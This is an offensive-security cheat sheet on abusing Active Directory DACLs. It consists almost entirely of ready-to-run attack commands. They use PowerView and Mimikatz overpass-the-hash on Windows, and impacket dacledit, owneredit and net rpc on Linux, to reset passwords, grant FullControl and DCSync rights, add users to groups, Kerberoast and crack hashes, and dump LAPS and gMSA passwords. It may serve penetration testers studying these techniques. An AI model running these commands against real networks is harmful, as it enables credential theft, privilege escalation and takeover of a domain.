title: DACL Attacks I
html:
DACL Attacks I

Abusing DACLs from Windows

Convert a username to SID with PowerView

$userSID = ConvertTo-SID jose

Get all ACE's for \<IDENTITY\> where the rights belongs to $userSID

Get-DomainObjectAcl -ResolveGUIDs -Identity <IDENTITY> | ?{$_.SecurityIdentifier -eq $userSID}

Perform a Password reset to Jose

Set-DomainUserPassword -Identity jose -AccountPassword $((ConvertTo-SecureString 'NewPassword' -AsPlainText -Force)) -Verbose

Read Computer LAPS Password using PowerView

Get-DomainObject -Identity LAPS10 -Properties "ms-mcs-AdmPwd",name

Perform an Overpass-the-Hash (OtH) using Mimikatz

mimikatz.exe privilege::debug "sekurlsa::pth /user:user-dev$ /domain:<domain> /ntlm:58867088B44350772FEBDB1E3DAD7G40 /run:powershell.exe" exit

Abusing DACLs from Linux

Get all DACL for the target Martha where the principal who has rights is Jose

python3 examples/dacledit.py -principal jose -target martha -dc-ip <target-ip> <domain>/user:Password

Add User FullControl over the account Jose

python3 examples/dacledit.py -principal user -target jose -dc-ip <target-ip> <domain>/user:Password -action write

Perform a targeted Kerberoasting Attack against martha and save the hash in martha.txt

python3 targetedKerberoast.py -vv -d <domain> -u user -p Password --request-user martha --dc-ip <target-ip> -o martha.txt

Modify DACL to add user DCSync rights

python3 examples/dacledit.py -principal user -target-dn dc=<domain-name>,dc=local -dc-ip <target-ip> <domain>/user:Password -action write -rights DCSync

Attempt to crack the Kerberoastable hash

hashcat -m 13100 martha.txt /usr/share/wordlists/rockyou.txt --force

Query the group's membership

net rpc group members 'Group Name' -U <domain>/user%Password -S <target-ip>

Add jose to group "Group Name"

net rpc group addmem 'Group Name' jose -U <domain>/user%Password -S <target-ip>

Perform a Password reset to Jose

net rpc password jose NewPassword -U <domain>/user%Password -S <target-ip>

Read All Computer LAPS Password using laps.py

python3 laps.py -u user -p Password -l <target-ip> -d <domain>

Read All gMSA Password using gMSADumper.py

python3 gMSADumper.py -d <domain> -l <target-ip> -u user -p Password

Change ownership from Jose to user

python3 examples/owneredit.py -new-owner user -target Jose -dc-ip <target-ip> <domain>/user:Password -action write
